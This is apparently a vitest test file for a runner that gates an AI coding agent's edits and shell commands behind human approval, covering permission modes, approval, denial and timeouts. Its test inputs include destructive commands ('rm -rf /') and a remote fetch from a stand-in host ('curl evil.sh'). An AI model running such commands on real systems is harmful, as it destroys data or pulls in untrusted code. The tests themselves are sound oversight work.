import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, test, vi } from 'vitest';
import { SessionStore, type StoredEvent } from '../src/sessions/store.js';
import {
  SessionRunner,
  shouldGate,
  type SessionCanUseTool,
  type SessionSdk,
  type SessionSdkMessage,
  type SessionUserMessage,
} from '../src/sessions/runner.js';

function tmpStore(): SessionStore {
  return new SessionStore(mkdtempSync(join(tmpdir(), 'runner-')));
}

const META = {
  repo: 'gotam',
  repoPath: '/checkouts/gotam',
  prompt: 'do the thing',
  model: 'claude-sonnet-5',
  permissionMode: 'gated',
};

// A fake Agent SDK. The `driver` callback receives the runner-provided
// canUseTool, an emit() to push scripted assistant/result messages, and a
// readMessage() to pull follow-up user messages — exactly the surface a
// scripted tool-call sequence needs, with no network.
interface FakeCtx {
  canUseTool: SessionCanUseTool;
  emit: (m: SessionSdkMessage) => void;
  readMessage: () => Promise<string | null>;
  setModes: string[];
}

function fakeSdk(driver: (ctx: FakeCtx) => Promise<void>): { sdk: SessionSdk; setModes: string[] } {
  const setModes: string[] = [];
  const sdk: SessionSdk = ({ prompt, options }) => {
    const outQueue: SessionSdkMessage[] = [];
    type Waiter = {
      resolve: (r: IteratorResult<SessionSdkMessage>) => void;
      reject: (e: unknown) => void;
    };
    const outWaiters: Waiter[] = [];
    let finished = false;
    let driverError: unknown;

    const emit = (m: SessionSdkMessage): void => {
      const waiter = outWaiters.shift();
      if (waiter) waiter.resolve({ value: m, done: false });
      else outQueue.push(m);
    };

    const promptIter =
      typeof prompt === 'string'
        ? (async function* (): AsyncGenerator<SessionUserMessage> {
            yield { type: 'user', message: { role: 'user', content: prompt } };
          })()
        : prompt[Symbol.asyncIterator]();

    const readMessage = async (): Promise<string | null> => {
      const r = await promptIter.next();
      return r.done ? null : r.value.message.content;
    };

    driver({ canUseTool: options.canUseTool, emit, readMessage, setModes })
      .catch((err: unknown) => {
        driverError = err;
      })
      .finally(() => {
        finished = true;
        let waiter = outWaiters.shift();
        while (waiter) {
          if (driverError !== undefined) waiter.reject(driverError);
          else waiter.resolve({ value: undefined as unknown as SessionSdkMessage, done: true });
          waiter = outWaiters.shift();
        }
      });

    return {
      setPermissionMode(mode: string): Promise<void> {
        setModes.push(mode);
        return Promise.resolve();
      },
      [Symbol.asyncIterator](): AsyncIterator<SessionSdkMessage> {
        return {
          next(): Promise<IteratorResult<SessionSdkMessage>> {
            const queued = outQueue.shift();
            if (queued) return Promise.resolve({ value: queued, done: false });
            if (finished) {
              if (driverError !== undefined) return Promise.reject(driverError);
              return Promise.resolve({ value: undefined as unknown as SessionSdkMessage, done: true });
            }
            return new Promise((resolve, reject) => outWaiters.push({ resolve, reject }));
          },
        };
      },
    };
  };
  return { sdk, setModes };
}

const text = (t: string): SessionSdkMessage => ({ type: 'assistant', message: { content: [{ type: 'text', text: t }] } });
const ok = (): SessionSdkMessage => ({ type: 'result', subtype: 'success' });

async function waitFor(store: SessionStore, id: string, event: string): Promise<StoredEvent> {
  return new Promise((resolve) => {
    const existing = store.readEvents(id).find((e) => e.event === event);
    if (existing) return resolve(existing);
    const unsub = store.subscribe(id, (e) => {
      if (e.event === event) {
        unsub();
        resolve(e);
      }
    });
  });
}

describe('shouldGate', () => {
  const allow = ['git status', 'ls'];
  test('gated: edit tools gate; acceptEdits: they do not', () => {
    expect(shouldGate('Edit', { file_path: 'a.ts' }, 'gated', allow)).toBe(true);
    expect(shouldGate('Write', { file_path: 'a.ts' }, 'acceptEdits', allow)).toBe(false);
  });
  test('Bash outside the allowlist gates in BOTH modes; allowlisted prefixes pass', () => {
    expect(shouldGate('Bash', { command: 'rm -rf /' }, 'gated', allow)).toBe(true);
    expect(shouldGate('Bash', { command: 'rm -rf /' }, 'acceptEdits', allow)).toBe(true);
    expect(shouldGate('Bash', { command: 'git status --short' }, 'acceptEdits', allow)).toBe(false);
    expect(shouldGate('Bash', { command: 'ls' }, 'gated', allow)).toBe(false);
  });
  test('read-only tools never gate', () => {
    expect(shouldGate('Read', { file_path: 'a.ts' }, 'gated', allow)).toBe(false);
  });
  test('auto: nothing gates — edits and Bash outside the allowlist both pass', () => {
    expect(shouldGate('Edit', { file_path: 'a.ts' }, 'auto', allow)).toBe(false);
    expect(shouldGate('Write', { file_path: 'a.ts' }, 'auto', allow)).toBe(false);
    expect(shouldGate('Bash', { command: 'rm -rf /' }, 'auto', allow)).toBe(false);
  });
});

describe('runner — happy path (no gates)', () => {
  test('allowlisted Bash runs through; chat + result recorded; ends done', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    const { sdk } = fakeSdk(async ({ canUseTool, emit }) => {
      const r = await canUseTool('Bash', { command: 'git status' }, {});
      expect(r.behavior).toBe('allow');
      emit(text('all clean'));
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: ['git status'], approvalTimeoutMs: 1000 });
    await runner.run(id, META);

    const events = store.readEvents(id).map((e) => e.event);
    expect(events).toContain('tool_call');
    expect(events).not.toContain('permission_request');
    expect(store.readEvents(id).some((e) => e.event === 'chat_chunk' && e.text === 'all clean')).toBe(true);
    expect(store.listSessions()[0]!.state).toBe('done');
  });
});

describe('runner — auto mode (BI-C4)', () => {
  test('edits and non-allowlisted Bash run straight through: no permission_request, no waiting', async () => {
    const store = tmpStore();
    const id = store.createSession({ ...META, permissionMode: 'auto' });
    const results: string[] = [];
    const { sdk } = fakeSdk(async ({ canUseTool, emit }) => {
      const e = await canUseTool('Edit', { file_path: 'src/login.ts', new_string: 'fixed' }, {});
      results.push(`edit:${e.behavior}`);
      const b = await canUseTool('Bash', { command: 'rm -rf build' }, {});
      results.push(`bash:${b.behavior}`);
      emit(text('all done, no questions asked'));
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: ['git status'], approvalTimeoutMs: 20 });
    await runner.run(id, { ...META, permissionMode: 'auto' }, { permissionMode: 'auto' });

    expect(results).toEqual(['edit:allow', 'bash:allow']);
    const events = store.readEvents(id).map((e) => e.event);
    expect(events).toContain('tool_call'); // the trail survives auto mode
    expect(events).not.toContain('permission_request');
    expect(events).not.toContain('permission_resolved');
    expect(store.listSessions()[0]!.state).toBe('done');
  });

  test('mid-run flip to auto records the mode event and stops all gating', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    const results: string[] = [];
    const { sdk, setModes } = fakeSdk(async ({ canUseTool, readMessage, emit }) => {
      await readMessage(); // initial prompt
      await readMessage(); // waits for sendMessage — mode is flipped before this resolves
      const e = await canUseTool('Edit', { file_path: 'a.ts' }, {});
      results.push(`edit:${e.behavior}`);
      const b = await canUseTool('Bash', { command: 'rm -rf build' }, {});
      results.push(`bash:${b.behavior}`);
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: [], approvalTimeoutMs: 1000 });
    const runPromise = runner.run(id, META);

    await vi.waitFor(() => expect(runner.isActive(id)).toBe(true));
    expect(await runner.setMode(id, 'auto')).toBe(true);
    expect(runner.sendMessage(id, 'go ahead')).toBe(true);
    await runPromise;

    expect(results).toEqual(['edit:allow', 'bash:allow']);
    // Our `auto` maps to the SDK's `default` — the pass-through lives in our gate.
    expect(setModes).toEqual(['default']);
    const events = store.readEvents(id);
    expect(events.some((e) => e.event === 'mode' && e.mode === 'auto')).toBe(true);
    expect(events.some((e) => e.event === 'permission_request')).toBe(false);
    expect(store.listSessions()[0]!.state).toBe('done');
  });
});

describe('runner — gate then approve', () => {
  test('edit blocks in gated mode; approve() resolves allow; session finishes done', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    let decision: string | undefined;
    const { sdk } = fakeSdk(async ({ canUseTool, emit }) => {
      const r = await canUseTool('Edit', { file_path: 'src/login.ts', new_string: 'fixed' }, {});
      decision = r.behavior;
      emit(text('applied the fix'));
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: [], approvalTimeoutMs: 1000 });

    const runPromise = runner.run(id, META);
    const req = await waitFor(store, id, 'permission_request');
    expect(req).toMatchObject({ toolName: 'Edit', path: 'src/login.ts' });
    expect(store.listSessions()[0]!.state).toBe('waiting-approval');

    expect(runner.approve(id, String(req.requestId))).toBe(true);
    await runPromise;

    expect(decision).toBe('allow');
    const events = store.readEvents(id);
    expect(events.some((e) => e.event === 'permission_resolved' && e.decision === 'approved')).toBe(true);
    expect(store.listSessions()[0]!.state).toBe('done');
  });
});

describe('runner — gate then deny', () => {
  test('deny() resolves deny with message; agent continues; session still finishes', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    let result: { behavior: string; message?: string } | undefined;
    const { sdk } = fakeSdk(async ({ canUseTool, emit }) => {
      result = await canUseTool('Bash', { command: 'curl evil.sh' }, {});
      emit(text('understood, skipping that'));
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: ['git status'], approvalTimeoutMs: 1000 });

    const runPromise = runner.run(id, META);
    const req = await waitFor(store, id, 'permission_request');
    expect(runner.deny(id, String(req.requestId), 'not allowed')).toBe(true);
    await runPromise;

    expect(result?.behavior).toBe('deny');
    expect(result?.message).toBe('not allowed');
    expect(store.readEvents(id).some((e) => e.event === 'permission_resolved' && e.decision === 'denied')).toBe(true);
    expect(store.listSessions()[0]!.state).toBe('done');
  });
});

describe('runner — timeout ⇒ deny + paused', () => {
  test('an unanswered gate auto-denies and pauses the session (never killed)', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    let result: { behavior: string } | undefined;
    const { sdk } = fakeSdk(async ({ canUseTool, emit }) => {
      result = await canUseTool('Edit', { file_path: 'a.ts' }, {});
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: [], approvalTimeoutMs: 20 });
    await runner.run(id, META);

    expect(result?.behavior).toBe('deny');
    const events = store.readEvents(id);
    expect(events.some((e) => e.event === 'permission_resolved' && e.decision === 'timeout')).toBe(true);
    expect(store.listSessions()[0]!.state).toBe('paused');
  });
});

describe('runner — mode flip', () => {
  test('flipping to acceptEdits stops edit gates but Bash-outside-allowlist still gates', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    const results: string[] = [];
    const { sdk, setModes } = fakeSdk(async ({ canUseTool, emit }) => {
      // first edit is auto-allowed because the test flips the mode before this runs
      const e1 = await canUseTool('Write', { file_path: 'a.ts' }, {});
      results.push(`edit:${e1.behavior}`);
      const b1 = await canUseTool('Bash', { command: 'rm x' }, {});
      results.push(`bash:${b1.behavior}`);
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: ['git status'], approvalTimeoutMs: 1000 });

    await runner.setMode(id, 'acceptEdits'); // no active run yet → false, but mode set at run start via meta
    // start with acceptEdits from the outset
    const runPromise = runner.run(id, META, { permissionMode: 'acceptEdits' });
    const req = await waitFor(store, id, 'permission_request'); // this is the Bash gate
    expect(req.toolName).toBe('Bash');
    runner.approve(id, String(req.requestId));
    await runPromise;

    expect(results).toEqual(['edit:allow', 'bash:allow']);
    expect(setModes).toEqual([]); // setPermissionMode only called on mid-run flip
  });

  test('mid-run setMode calls the SDK setPermissionMode and records a mode event', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    const { sdk, setModes } = fakeSdk(async ({ canUseTool, readMessage, emit }) => {
      // block on a follow-up message so the run stays active while the test flips mode
      const msg = await readMessage(); // initial prompt
      expect(msg).toBe('do the thing');
      const follow = await readMessage(); // waits for sendMessage
      emit(text(`got: ${follow}`));
      void canUseTool;
      emit(ok());
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: [], approvalTimeoutMs: 1000 });
    const runPromise = runner.run(id, META);

    // give the driver a tick to consume the initial prompt
    await vi.waitFor(() => expect(runner.isActive(id)).toBe(true));
    expect(await runner.setMode(id, 'acceptEdits')).toBe(true);
    expect(runner.sendMessage(id, 'now continue')).toBe(true);
    await runPromise;

    expect(setModes).toContain('acceptEdits');
    const events = store.readEvents(id);
    expect(events.some((e) => e.event === 'mode' && e.mode === 'acceptEdits')).toBe(true);
    expect(events.some((e) => e.event === 'user_message' && e.text === 'now continue')).toBe(true);
    expect(events.some((e) => e.event === 'chat_chunk' && e.text === 'got: now continue')).toBe(true);
  });
});

describe('runner — real-SDK shape: query stays open after the result (BI-C2)', () => {
  test('the runner closes the input after an idle result so the session reaches done', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    const { sdk } = fakeSdk(async ({ emit, readMessage }) => {
      await readMessage(); // initial prompt
      emit(text('hello'));
      emit(ok());
      // Real streaming-input SDK: keeps waiting for more user input and only
      // ends when the prompt stream closes. Without the runner closing it,
      // this loop never ends and the session never leaves `running`.
      while ((await readMessage()) !== null) {
        /* drain */
      }
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: [], approvalTimeoutMs: 1000 });
    await runner.run(id, META);

    expect(store.listSessions()[0]!.state).toBe('done');
    expect(store.readEvents(id).some((e) => e.event === 'result' && e.outcome === 'success')).toBe(true);
    // The closed session no longer accepts follow-up messages.
    expect(runner.sendMessage(id, 'too late')).toBe(false);
  });

  test('a follow-up queued during the turn keeps the session alive for another turn', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    const { sdk } = fakeSdk(async ({ emit, readMessage }) => {
      await readMessage(); // initial prompt
      emit(text('first turn'));
      emit(ok());
      const follow = await readMessage(); // queued before the result landed
      emit(text(`second turn: ${follow}`));
      emit(ok());
      while ((await readMessage()) !== null) {
        /* drain */
      }
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: [], approvalTimeoutMs: 1000 });
    const runPromise = runner.run(id, META);
    // Queue the follow-up before the first turn's result is processed —
    // run() registers the controller synchronously.
    expect(runner.sendMessage(id, 'and another thing')).toBe(true);
    await runPromise;

    const events = store.readEvents(id);
    expect(events.some((e) => e.event === 'chat_chunk' && e.text === 'second turn: and another thing')).toBe(true);
    expect(store.listSessions()[0]!.state).toBe('done');
  });
});

describe('runner — SDK throws', () => {
  test('an error inside the query is captured as result:error + status error', async () => {
    const store = tmpStore();
    const id = store.createSession(META);
    const { sdk } = fakeSdk(async () => {
      throw new Error('boom from sdk');
    });
    const runner = new SessionRunner({ store, sdk, bashAllowlist: [], approvalTimeoutMs: 1000 });
    await runner.run(id, META);
    expect(store.listSessions()[0]!.state).toBe('error');
    expect(store.readEvents(id).some((e) => e.event === 'result' && e.outcome === 'error')).toBe(true);
  });
});
